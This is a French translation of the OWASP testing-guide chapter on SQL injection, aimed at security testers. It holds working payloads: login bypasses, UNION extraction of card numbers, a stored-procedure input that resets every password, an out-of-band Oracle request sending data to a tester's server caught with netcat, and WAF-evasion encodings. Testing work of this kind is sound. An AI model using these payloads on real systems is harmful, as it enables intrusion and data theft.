# Test d'injection SQL

|ID |
|------------|
|WSTG-INPV-05|

## Sommaire

Les tests d'injection SQL vérifient s'il est possible d'injecter des données dans l'application afin qu'elle exécute une requête SQL contrôlée par l'utilisateur dans la base de données. Les testeurs trouvent une vulnérabilité d'injection SQL si l'application utilise une entrée utilisateur pour créer des requêtes SQL sans validation d'entrée appropriée. Une exploitation réussie de cette classe de vulnérabilité permet à un utilisateur non autorisé d'accéder ou de manipuler des données dans la base de données.

Une attaque par [injection SQL](https://owasp.org/www-community/attacks/SQL_Injection) consiste en l'insertion ou "l'injection" d'une requête SQL partielle ou complète via l'entrée de données ou transmise depuis le client (navigateur) à l'application Web. Une attaque par injection SQL réussie peut lire des données sensibles de la base de données, modifier les données de la base de données (insérer/mettre à jour/supprimer), exécuter des opérations d'administration sur la base de données (telles que l'arrêt du SGBD), récupérer le contenu d'un fichier donné existant sur le fichier du SGBD système ou écrire des fichiers dans le système de fichiers et, dans certains cas, envoyer des commandes au système d'exploitation. Les attaques par injection SQL sont un type d'attaque par injection, dans lequel des commandes SQL sont injectées dans l'entrée du plan de données afin d'affecter l'exécution de commandes SQL prédéfinies.

En général, la façon dont les applications Web construisent des instructions SQL impliquant la syntaxe SQL écrite par les programmeurs est mélangée avec des données fournies par l'utilisateur. Exemple:

`select title, text from news where id=$id`

Dans l'exemple ci-dessus, la variable `$id` contient des données fournies par l'utilisateur, tandis que le reste est la partie statique SQL fournie par le programmeur ; rendre l'instruction SQL dynamique.

En raison de la manière dont il a été construit, l'utilisateur peut fournir une entrée spécialement conçue en essayant de faire en sorte que l'instruction SQL d'origine exécute d'autres actions de son choix. L'exemple ci-dessous illustre les données fournies par l'utilisateur "10 ou 1=1", modifiant la logique de l'instruction SQL, modifiant la clause WHERE en ajoutant une condition "ou 1=1".

`select title, text from news where id=10 or 1=1`

Les attaques par injection SQL peuvent être divisées en trois classes :

- Inband : les données sont extraites en utilisant le même canal que celui utilisé pour injecter le code SQL. Il s'agit du type d'attaque le plus simple, dans lequel les données récupérées sont présentées directement dans la page Web de l'application.
- Hors bande : les données sont récupérées via un canal différent (par exemple, un e-mail avec les résultats de la requête est généré et envoyé au testeur).
- Inférentiel ou aveugle : il n'y a pas de transfert réel de données, mais le testeur est capable de reconstruire les informations en envoyant des requêtes particulières et en observant le comportement résultant du serveur de base de données.

Une attaque par injection SQL réussie nécessite que l'attaquant élabore une requête SQL syntaxiquement correcte. Si l'application renvoie un message d'erreur généré par une requête incorrecte, il peut alors être plus facile pour un attaquant de reconstruire la logique de la requête d'origine et, par conséquent, de comprendre comment effectuer correctement l'injection. Toutefois, si l'application masque les détails de l'erreur, le testeur doit être en mesure de rétro-concevoir la logique de la requête d'origine.

Concernant les techniques d'exploitation des failles d'injection SQL, il existe cinq techniques communes. De plus, ces techniques peuvent parfois être utilisées de manière combinée (par exemple, opérateur syndical et hors bande):

- Opérateur Union : peut être utilisé lorsque la faille d'injection SQL se produit dans une instruction SELECT, permettant de combiner deux requêtes en un seul résultat ou ensemble de résultats.
- Booléen : utilisez des conditions booléennes pour vérifier si certaines conditions sont vraies ou fausses.
- Error based : cette technique force la base de données à générer une erreur, donnant à l'attaquant ou au testeur des informations sur lesquelles affiner son injection.
- Out-of-band : technique utilisée pour récupérer des données en utilisant un canal différent (par exemple, établir une connexion HTTP pour envoyer les résultats à un serveur Web).
- Délai : utilisez les commandes de la base de données (par exemple, sleep) pour retarder les réponses dans les requêtes conditionnelles. C'est utile lorsque l'attaquant n'a pas de réponse (résultat, sortie ou erreur) de l'application.

## Objectifs des tests

- Identifier les points d'injection SQL.
- Évaluer la gravité de l'injection et le niveau d'accès qui peut être atteint grâce à celle-ci.

## Comment tester

### Techniques de détection

La première étape de ce test consiste à comprendre quand l'application interagit avec un serveur de base de données afin d'accéder à certaines données. Voici des exemples typiques de cas où une application doit communiquer avec une base de données :

- Formulaires d'authentification : lorsque l'authentification est effectuée à l'aide d'un formulaire Web, il est probable que les informations d'identification de l'utilisateur soient vérifiées par rapport à une base de données contenant tous les noms d'utilisateur et mots de passe (ou, mieux, les hachages de mots de passe).
- Moteurs de recherche : la chaîne soumise par l'utilisateur peut être utilisée dans une requête SQL qui extrait tous les enregistrements pertinents d'une base de données.
- Sites E-Commerce : les produits et leurs caractéristiques (prix, description, disponibilité, etc.) sont très susceptibles d'être stockés dans une base de données.

Le testeur doit faire une liste de tous les champs d'entrée dont les valeurs pourraient être utilisées dans l'élaboration d'une requête SQL, y compris les champs cachés des requêtes POST, puis les tester séparément, en essayant d'interférer avec la requête et de générer une erreur. Considérez également les en-têtes HTTP et les cookies.

Le tout premier test consiste généralement à ajouter un guillemet simple `'` ou un point-virgule `;` au champ ou au paramètre testé. Le premier est utilisé dans SQL comme un terminateur de chaîne et, s'il n'est pas filtré par l'application, conduirait à une requête incorrecte. Le second sert à terminer une instruction SQL et, s'il n'est pas filtré, il est également susceptible de générer une erreur. La sortie d'un champ vulnérable peut ressembler à ce qui suit (sur un serveur Microsoft SQL, dans ce cas) :

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

Les délimiteurs de commentaires (`--` ou `/* */`, etc.) et d'autres mots clés SQL comme `AND` et `OR` peuvent également être utilisés pour essayer de modifier la requête. Une technique très simple mais parfois toujours efficace consiste simplement à insérer une chaîne là où un nombre est attendu, car une erreur comme celle-ci pourrait être générée :

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Surveillez toutes les réponses du serveur Web et examinez le code source HTML/JavaScript. Parfois, l'erreur est présente à l'intérieur mais pour une raison quelconque (par exemple, une erreur JavaScript, des commentaires HTML, etc.) n'est pas présentée à l'utilisateur. Un message d'erreur complet, comme ceux des exemples, fournit une mine d'informations au testeur afin de monter une attaque par injection réussie. Cependant, les applications ne fournissent souvent pas autant de détails : une simple "erreur de serveur 500" ou une page d'erreur personnalisée peut être émise, ce qui signifie que nous devons utiliser des techniques d'injection aveugle. Dans tous les cas, il est très important de tester chaque champ séparément : une seule variable doit varier tandis que toutes les autres restent constantes, afin de comprendre précisément quels paramètres sont vulnérables et lesquels ne le sont pas.

### Test d'injection SQL standard

#### Injection SQL classique

Considérez la requête SQL suivante :

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Une requête similaire est généralement utilisée depuis l'application web afin d'authentifier un utilisateur. Si la requête renvoie une valeur, cela signifie qu'à l'intérieur de la base de données un utilisateur avec cet ensemble d'informations d'identification existe, alors l'utilisateur est autorisé à se connecter au système, sinon l'accès est refusé. Les valeurs des champs de saisie sont généralement obtenues auprès de l'utilisateur via un formulaire Web. Supposons que nous insérions les valeurs Username et Password suivantes :

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

La requête sera :

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

Si nous supposons que les valeurs des paramètres sont envoyées au serveur via la méthode GET, et si le domaine du site vulnérable est www.exemple.com, la requête que nous effectuerons sera :

`http://www.exemple.com/index.php?username=1'%20or%20'1'%20=%20'1&amp;password=1'%20or%20'1'%20=%20'1`

Après une courte analyse, nous remarquons que la requête renvoie une valeur (ou un ensemble de valeurs) car la condition est toujours vraie (`OR 1=1`). De cette façon, le système a authentifié l'utilisateur sans connaître le nom d'utilisateur et le mot de passe.

> Remarque : Dans certains systèmes, la première ligne d'un tableau d'utilisateurs correspond à un utilisateur administrateur. Il peut s'agir du profil renvoyé dans certains cas.

Un autre exemple de requête est le suivant :

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

Dans ce cas, il y a deux problèmes, l'un dû à l'utilisation des parenthèses et l'autre à l'utilisation de la fonction de hachage MD5. Tout d'abord, nous résolvons le problème des parenthèses. Cela consiste simplement à ajouter un certain nombre de parenthèses fermantes jusqu'à obtenir une requête corrigée. Pour résoudre le deuxième problème, nous essayons d'échapper à la deuxième condition. Nous ajoutons à notre requête un symbole final qui signifie qu'un commentaire commence. De cette façon, tout ce qui suit ce symbole est considéré comme un commentaire. Chaque SGBD a sa propre syntaxe pour les commentaires, cependant, un symbole commun à la grande majorité des bases de données est `/*`. Dans Oracle, le symbole est `--`. Cela dit, les valeurs que nous utiliserons comme nom d'utilisateur et mot de passe sont :

`$username = 1' or '1' = '1'))/*`

`$password = foo`

De cette manière, nous obtiendrons la requête suivante :

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(En raison de l'inclusion d'un délimiteur de commentaire dans la valeur `$username`, la partie mot de passe de la requête sera ignorée.)

L'URL de la requête sera :

`http://www.exemple.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&amp;password=foo`

Cela peut renvoyer un certain nombre de valeurs. Parfois, le code d'authentification vérifie que le nombre d'enregistrements/résultats retournés est exactement égal à 1. Dans les exemples précédents, cette situation serait difficile (dans la base de données, il n'y a qu'une seule valeur par utilisateur). Pour contourner ce problème, il suffit d'insérer une commande SQL qui impose comme condition que le nombre de résultats renvoyés soit un (un enregistrement renvoyé). Afin d'atteindre cet objectif, nous utilisons l'opérateur `LIMIT <num>`, où `<num>` est le nombre de résultats/enregistrements que nous voulons renvoyer. Par rapport à l'exemple précédent, la valeur des champs Username et Password sera modifiée comme suit :

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

De cette manière, nous créons une requête comme celle-ci :

`http://www.exemple.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&amp;password=foo`

#### Instruction SELECT

Considérez la requête SQL suivante :

`SELECT * FROM products WHERE id_product=$id_product`

Considérez également la requête à un script qui exécute la requête ci-dessus :

`http://www.exemple.com/product.php?id=10`

Lorsque le testeur essaie une valeur valide (par exemple 10 dans ce cas), l'application renvoie la description d'un produit. Un bon moyen de tester si l'application est vulnérable dans ce scénario est de jouer avec la logique, en utilisant les opérateurs AND et OR.

Considérez la demande :

`http://www.exemple.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

Dans ce cas, l'application renverra probablement un message nous indiquant qu'il n'y a pas de contenu disponible ou une page vierge. Ensuite, le testeur peut envoyer une déclaration vraie et vérifier s'il y a un résultat valide :

`http://www.exemple.com/product.php?id=10 AND 1=1`

#### Requêtes empilées

Selon l'API utilisée par l'application Web et le SGBD (par exemple, PHP + PostgreSQL, ASP+SQL SERVER), il peut être possible d'exécuter plusieurs requêtes en un seul appel.

Considérez la requête SQL suivante :

`SELECT * FROM products WHERE id_product=$id_product`

Une façon d'exploiter le scénario ci-dessus serait:

`http://www.exemple.com/product.php?id=10; INSERT INTO users (…)`

De cette manière, il est possible d'exécuter plusieurs requêtes à la suite et indépendamment de la première requête.

### Empreinte digitale de la base de données

Même si le langage SQL est un standard, chaque SGBD a sa particularité et diffère les uns des autres par de nombreux aspects comme les commandes spéciales, les fonctions pour récupérer des données telles que les noms d'utilisateurs et les bases de données, les fonctionnalités, la ligne de commentaires, etc.

Lorsque les testeurs passent à une exploitation d'injection SQL plus avancée, ils doivent savoir quelle est la base de données principale.

#### Erreurs renvoyées par l'application

La première façon de savoir quelle base de données principale est utilisée consiste à observer l'erreur renvoyée par l'application. Voici quelques exemples de messages d'erreur :

MySql :

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Un UNION SELECT complet avec version() peut également aider à connaître la base de données principale.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

S'il n'y a pas de message d'erreur ou un message d'erreur personnalisé, le testeur peut essayer d'injecter dans des champs de chaîne en utilisant différentes techniques de concaténation :

- MySql : ‘test’ + ‘ing’
- SQL Server : ‘test’ ‘ing’
- Oracle : ‘test’||’ing’
- PostgreSQL : ‘test’||’ing’

### Techniques d'exploitation

#### Technique d'exploitation syndicale

L'opérateur UNION est utilisé dans les injections SQL pour joindre une requête, délibérément falsifiée par le testeur, à la requête d'origine. Le résultat de la requête falsifiée sera joint au résultat de la requête d'origine, permettant au testeur d'obtenir les valeurs des colonnes d'autres tables. Supposons pour nos exemples que la requête exécutée depuis le serveur soit la suivante :

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

Nous allons définir la valeur `$id` suivante :

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Nous aurons la requête suivante :

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Qui joindra le résultat de la requête d'origine avec tous les numéros de carte de crédit dans la table CreditCardTable. Le mot clé `ALL` est nécessaire pour contourner les requêtes qui utilisent le mot clé `DISTINCT`. Par ailleurs, nous remarquons qu'au-delà des numéros de carte bancaire, nous avons sélectionné deux autres valeurs. Ces deux valeurs sont nécessaires car les deux requêtes doivent avoir un nombre égal de paramètres/colonnes afin d'éviter une erreur de syntaxe.

Le premier détail dont un testeur a besoin pour exploiter la vulnérabilité d'injection SQL à l'aide d'une telle technique est de trouver le bon nombre de colonnes dans l'instruction SELECT.

Pour ce faire, le testeur peut utiliser la clause "ORDER BY" suivie d'un nombre indiquant la numérotation de la colonne de la base de données sélectionnée :

`http://www.exemple.com/product.php?id=10 ORDER BY 10--`

Si la requête s'exécute avec succès, le testeur peut supposer, dans cet exemple, qu'il y a 10 colonnes ou plus dans l'instruction `SELECT`. Si la requête échoue, il doit y avoir moins de 10 colonnes renvoyées par la requête. S'il y a un message d'erreur disponible, ce serait probablement :

`Unknown column '10' in 'order clause'`

Une fois que le testeur a découvert le nombre de colonnes, l'étape suivante consiste à déterminer le type de colonnes. En supposant qu'il y avait 3 colonnes dans l'exemple ci-dessus, le testeur pourrait essayer chaque type de colonne, en utilisant la valeur NULL pour les aider :

`http://www.exemple.com/product.php?id=10 UNION SELECT 1,null,null--`

Si la requête échoue, le testeur verra probablement un message du type :

`All cells in a column must have the same datatype`

Si la requête s'exécute avec succès, la première colonne peut être un entier. Ensuite, le testeur peut aller plus loin et ainsi de suite :

`http://www.exemple.com/product.php?id=10 UNION SELECT 1,1,null--`

Après la collecte d'informations réussie, selon l'application, il se peut que le testeur ne montre que le premier résultat, car l'application ne traite que la première ligne de l'ensemble de résultats. Dans ce cas, il est possible d'utiliser une clause `LIMIT` ou le testeur peut définir une valeur non valide, rendant uniquement la deuxième requête valide (en supposant qu'il n'y ait aucune entrée dans la base de données dont l'ID est 99999) :

`http://www.exemple.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### Technique d'exploitation booléenne

La technique d'exploitation booléenne est très utile lorsque le testeur trouve une situation [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection), dans laquelle rien n'est connu sur le résultat d'une opération. Par exemple, ce comportement se produit dans les cas où le programmeur a créé une page d'erreur personnalisée qui ne révèle rien sur la structure de la requête ou sur la base de données. (La page ne renvoie pas d'erreur SQL, elle peut simplement renvoyer un HTTP 500, 404 ou une redirection).

En utilisant des méthodes d'inférence, il est possible d'éviter cet obstacle et ainsi de réussir à récupérer les valeurs de certains champs souhaités. Cette méthode consiste à effectuer une série de requêtes booléennes auprès du serveur, à observer les réponses et enfin à déduire la signification de ces réponses. Nous considérons, comme toujours, le domaine www.exemple.com et nous supposons qu'il contient un paramètre nommé `id` vulnérable à l'injection SQL. Cela signifie que l'exécution de la requête suivante :

`http://www.exemple.com/index.php?id=1'`

Nous obtiendrons une page avec une erreur de message personnalisée due à une erreur syntaxique dans la requête. On suppose que la requête exécutée sur le serveur est :

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

Ce qui est exploitable par les méthodes vues précédemment. Ce que nous voulons obtenir, ce sont les valeurs du champ username. Les tests que nous allons exécuter nous permettront d'obtenir la valeur du champ username, en extrayant cette valeur caractère par caractère. Ceci est possible grâce à l'utilisation de certaines fonctions standard, présentes dans pratiquement toutes les bases de données. Pour nos exemples, nous utiliserons les pseudo-fonctions suivantes :

- SUBSTRING(texte, début, longueur) : renvoie une sous-chaîne à partir de la position "début" du texte et de longueur "longueur". Si "start" est supérieur à la longueur du texte, la fonction renvoie une valeur nulle.

- ASCII(char): il restitue la valeur ASCII du caractère saisi. Une valeur nulle est renvoyée si char vaut 0.

- LENGTH(texte) : il restitue le nombre de caractères dans le texte saisi.

A travers de telles fonctions, nous exécuterons nos tests sur le premier caractère et, lorsque nous aurons découvert la valeur, nous passerons au second et ainsi de suite, jusqu'à ce que nous ayons découvert la valeur entière. Les tests tireront parti de la fonction SUBSTRING, afin de ne sélectionner qu'un seul caractère à la fois (sélectionner un seul caractère revient à imposer le paramètre de longueur à 1), et de la fonction ASCII, afin d'obtenir la valeur ASCII, de sorte que nous pouvons faire une comparaison numérique. Les résultats de la comparaison se feront avec toutes les valeurs de la table ASCII, jusqu'à ce que la bonne valeur soit trouvée. Par exemple, nous utiliserons la valeur suivante pour `Id` :

`$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

Cela crée la requête suivante (à partir de maintenant, nous l'appellerons "requête inférentielle") :

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

L'exemple précédent retourne un résultat si et seulement si le premier caractère du champ username est égal à la valeur ASCII 97. Si on obtient une valeur fausse, alors on augmente l'index de la table ASCII de 97 à 98 et on réitère la requête . Si au contraire nous obtenons une valeur vraie, nous mettons à zéro l'indice de la table ASCII et nous analysons le caractère suivant en modifiant les paramètres de la fonction SUBSTRING. Le problème est de comprendre de quelle manière on peut distinguer les tests retournant une valeur vraie de ceux retournant faux. Pour ce faire, nous créons une requête qui retourne toujours faux. Ceci est possible en utilisant la valeur suivante pour `Id` :

`$Id=1' AND '1' = '2`

Ce qui créera la requête suivante :

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

La réponse obtenue du serveur (c'est-à-dire le code HTML) sera la valeur fausse pour nos tests. Cela suffit pour vérifier si la valeur obtenue à partir de l'exécution de la requête inférentielle est égale à la valeur obtenue avec le test exécuté auparavant. Parfois, cette méthode ne fonctionne pas. Si le serveur renvoie deux pages différentes à la suite de deux requêtes Web consécutives identiques, nous ne pourrons pas discriminer la vraie valeur de la fausse valeur. Dans ces cas particuliers, il est nécessaire d'utiliser des filtres particuliers qui permettent d'éliminer le code qui change entre les deux requêtes et d'obtenir un template. Plus tard, pour chaque requête inférentielle exécutée, nous extrairons le modèle relatif de la réponse à l'aide de la même fonction, et nous effectuerons un contrôle entre les deux modèles afin de décider du résultat du test.

Dans la discussion précédente, nous n'avons pas abordé le problème de la détermination de la condition de fin de nos tests, c'est-à-dire quand nous devrions terminer la procédure d'inférence. Une technique pour ce faire utilise une caractéristique de la fonction SUBSTRING et de la fonction LENGTH. Lorsque le test compare le caractère courant avec le code ASCII 0 (c'est-à-dire la valeur nulle) et que le test renvoie la valeur true, alors soit nous en avons fini avec la procédure d'inférence (nous avons scanné toute la chaîne), soit la valeur que nous avons analysé contient le caractère nul.

Nous allons insérer la valeur suivante pour le champ `Id` :

`$Id=1' AND LENGTH(username)=N AND '1' = '1`

Où N est le nombre de caractères que nous avons analysés jusqu'à présent (sans compter la valeur nulle). La requête sera :

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'`

La requête renvoie true ou false. Si nous obtenons vrai, nous avons terminé l'inférence et, par conséquent, nous connaissons la valeur du paramètre. Si nous obtenons faux, cela signifie que le caractère nul est présent dans la valeur du paramètre, et nous devons continuer à analyser le paramètre suivant jusqu'à ce que nous trouvions une autre valeur nulle.

L'attaque par injection SQL aveugle nécessite un volume élevé de requêtes. Le testeur peut avoir besoin d'un outil automatique pour exploiter la vulnérabilité.

#### Technique d'exploitation basée sur les erreurs

Une technique d'exploitation basée sur les erreurs est utile lorsque le testeur, pour une raison quelconque, ne peut pas exploiter la vulnérabilité d'injection SQL à l'aide d'une autre technique telle que UNION. La technique basée sur les erreurs consiste à forcer la base de données à effectuer une opération dans laquelle le résultat sera une erreur. Le but ici est d'essayer d'extraire certaines données de la base de données et de les afficher dans le message d'erreur. Cette technique d'exploitation peut être différente d'un SGBD à l'autre (voir la section spécifique au SGBD).

Considérez la requête SQL suivante :

`SELECT * FROM products WHERE id_product=$id_product`

Considérez également la requête à un script qui exécute la requête ci-dessus :

`http://www.exemple.com/product.php?id=10`

La requête malveillante serait (par exemple Oracle 10g) :

`http://www.exemple.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

Dans cet exemple, le testeur concatène la valeur 10 avec le résultat de la fonction `UTL_INADDR.GET_HOST_NAME`. Cette fonction Oracle essaiera de renvoyer le nom d'hôte du paramètre qui lui est passé, qui est une autre requête, le nom de l'utilisateur. Lorsque la base de données recherche un nom d'hôte avec le nom de la base de données utilisateur, elle échoue et renvoie un message d'erreur du type :

`ORA-292257: host SCOTT unknown`

Ensuite, le testeur peut manipuler le paramètre passé à la fonction GET_HOST_NAME() et le résultat sera affiché dans le message d'erreur.

#### Technique d'exploitation hors bande

Cette technique est très utile lorsque le testeur trouve une situation [Injection SQL aveugle](https://owasp.org/www-community/attacks/Blind_SQL_Injection), dans laquelle rien n'est connu sur le résultat d'une opération. La technique consiste à utiliser des fonctions SGBD pour effectuer une connexion hors bande et fournir les résultats de la requête injectée dans le cadre de la requête au serveur du testeur. Comme les techniques basées sur les erreurs, chaque SGBD a ses propres fonctions. Vérifiez la section spécifique du SGBD.

Considérez la requête SQL suivante :

`SELECT * FROM products WHERE id_product=$id_product`

Considérez également la requête à un script qui exécute la requête ci-dessus :

`http://www.exemple.com/product.php?id=10`

La requête malveillante serait :

`http://www.exemple.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

Dans cet exemple, le testeur concatène la valeur 10 avec le résultat de la fonction `UTL_HTTP.request`. Cette fonction Oracle essaiera de se connecter à `testerserver` et fera une requête HTTP GET contenant le retour de la requête `SELECT user FROM DUAL`. Le testeur peut configurer un serveur Web (par exemple Apache) ou utiliser l'outil Netcat :

```bash
/home/tester/nc –nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### Technique d'exploitation du délai

La technique d'exploitation du délai est très utile lorsque le testeur trouve une situation [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection), dans laquelle rien n'est connu sur le résultat d'une opération. Cette technique consiste à envoyer une requête injectée et dans le cas où la condition est vraie, le testeur peut surveiller le temps mis par le serveur pour répondre. S'il y a un délai, le testeur peut supposer que le résultat de la requête conditionnelle est vrai. Cette technique d'exploitation peut être différente d'un SGBD à l'autre (voir la section spécifique au SGBD).

Considérez la requête SQL suivante :

`SELECT * FROM products WHERE id_product=$id_product`

Considérez également la requête à un script qui exécute la requête ci-dessus :

`http://www.exemple.com/product.php?id=10`

La requête malveillante serait (par exemple MySql 5.x) :

`http://www.exemple.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

Dans cet exemple, le testeur vérifie si la version de MySql est 5.x ou non, obligeant le serveur à retarder la réponse de 10 secondes. Le testeur peut augmenter le temps de retard et surveiller les réponses. Le testeur n'a pas non plus besoin d'attendre la réponse. Parfois, il peut définir une valeur très élevée (par exemple 100) et annuler la demande après quelques secondes.

#### Injection de procédure stockée

Lors de l'utilisation de SQL dynamique dans une procédure stockée, l'application doit nettoyer correctement l'entrée de l'utilisateur pour éliminer le risque d'injection de code. S'il n'est pas nettoyé, l'utilisateur peut entrer du code SQL malveillant qui sera exécuté dans la procédure stockée.

Considérez la procédure stockée SQL Server suivante :

```sql
Create procedure user_login @username varchar(20), @passwd varchar(20)
As
Declare @sqlstring varchar(250)
Set @sqlstring  = ‘
Select 1 from users
Where username = ‘ + @username + ‘ and passwd = ‘ + @passwd
exec(@sqlstring)
Go
```

Entrée utilisateur :

```sql
anyusername or 1=1'
anypassword
```

Cette procédure ne nettoie pas l'entrée, permettant ainsi à la valeur de retour d'afficher un enregistrement existant avec ces paramètres.

> Cet exemple peut sembler peu probable en raison de l'utilisation de SQL dynamique pour connecter un utilisateur, mais considérons une requête de rapport dynamique où l'utilisateur sélectionne les colonnes à afficher. L'utilisateur pourrait insérer un code malveillant dans ce scénario et compromettre les données.

Considérez la procédure stockée SQL Server suivante :

```sql
Create
procedure get_report @columnamelist varchar(7900)
As
Declare @sqlstring varchar(8000)
Set @sqlstring  = ‘
Select ‘ + @columnamelist + ‘ from ReportTable‘
exec(@sqlstring)
Go
```

Entrée utilisateur :

```sql
1 from users; update users set password = 'password'; select *
```

Cela entraînera l'exécution du rapport et la mise à jour des mots de passe de tous les utilisateurs.

#### Exploitation automatisée

La plupart des situations et des techniques présentées ici peuvent être réalisées de manière automatisée à l'aide de certains outils. Dans cet article, le testeur peut trouver des informations sur la façon d'effectuer un audit automatisé à l'aide de [SQLMap](https://wiki.owasp.org/index.php/Automated_Audit_using_SQLMap)

### Techniques d'évasion de signature par injection SQL

Les techniques sont utilisées pour contourner les défenses telles que les pare-feu d'applications Web (WAF) ou les systèmes de prévention des intrusions (IPS). Reportez-vous également à [https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

#### Espace blanc

Suppression d'espace ou ajout d'espaces qui n'affecteront pas l'instruction SQL. Par exemple

```sql
or 'a'='a'

or 'a'  =    'a'
```

Ajouter un caractère spécial comme une nouvelle ligne ou une tabulation qui ne changera pas l'exécution de l'instruction SQL. Par exemple,

```sql
or
'a'=
        'a'
```

#### Octets nuls

Utilisez un octet nul (%00) avant tout caractère bloqué par le filtre.

Par exemple, si l'attaquant peut injecter le code SQL suivant

`' UNION SELECT password FROM Users WHERE username='admin'--`

ajouter des octets nuls sera

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### Commentaires SQL

L'ajout de commentaires SQL en ligne peut également aider l'instruction SQL à être valide et contourner le filtre d'injection SQL. Prenez cette injection SQL comme exemple.

`' UNION SELECT password FROM Users WHERE name='admin'--`

L'ajout de commentaires en ligne SQL le sera.

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### Encodage d'URL

Utilisez le [codage d'URL en ligne](https://meyerweb.com/eric/tools/dencoder/) pour coder l'instruction SQL

`' UNION SELECT password FROM Users WHERE name='admin'--`

L'encodage de l'URL de l'instruction d'injection SQL sera

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Encodage de caractère

La fonction Char() peut être utilisée pour remplacer le caractère anglais. Par exemple, char(114,111,111,116) signifie racine

`' UNION SELECT password FROM Users WHERE name='root'--`

Pour appliquer le Char(), l'instruction d'injection SQL sera

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### Concaténation de chaînes

La concaténation décompose les mots-clés SQL et échappe aux filtres. La syntaxe de concaténation varie en fonction du moteur de base de données. Prenez le moteur MS SQL comme exemple

`select 1`

L'instruction SQL simple peut être modifiée comme ci-dessous en utilisant la concaténation

`EXEC('SEL' + 'ECT 1')`

#### Encodage hexadécimal

La technique de codage hexadécimal utilise le codage hexadécimal pour remplacer le caractère de l'instruction SQL d'origine. Par exemple, `root` peut être représenté par `726F6F74`

`Select user from users where name = 'root'`

L'instruction SQL en utilisant la valeur HEX sera :

`Select user from users where name = 726F6F74`

ou

`Select user from users where name = unhex('726F6F74')`

#### Déclarer des variables

Déclarez l'instruction d'injection SQL dans la variable et exécutez-la.

Par exemple, l'instruction d'injection SQL ci-dessous

`Union Select password`

Définissez l'instruction SQL dans la variable `SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Expression alternative de 'ou 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```

### Injection de caractères génériques SQL

La plupart des dialectes SQL prennent en charge à la fois les caractères génériques à un seul caractère (généralement "`?`" ou "`_`") et les caractères génériques à plusieurs caractères (généralement "`%`" ou "`*`"), qui peuvent être utilisés dans les requêtes avec l'opérateur "LIKE". Même lorsque des contrôles appropriés (tels que des paramètres ou des instructions préparées) sont utilisés pour se protéger contre les attaques par injection SQL, il peut être possible d'injecter des caractères génériques dans les requêtes.

Par exemple, si une application Web permet aux utilisateurs d'entrer un code de réduction dans le cadre du processus de paiement, et qu'elle vérifie si ce code existe dans la base de données à l'aide d'une requête telle que `SELECT * FROM discount_codes WHERE code LIKE ':code'`, puis la saisie d'une valeur de `%` (qui serait insérée à la place du paramètre `:code`) correspondrait à tous les codes de réduction.

Cette technique pourrait également être utilisée pour déterminer les codes de réduction exacts via des requêtes de plus en plus spécifiques (telles que `a%`, `b%`, `ba%`, etc.).

## Correction

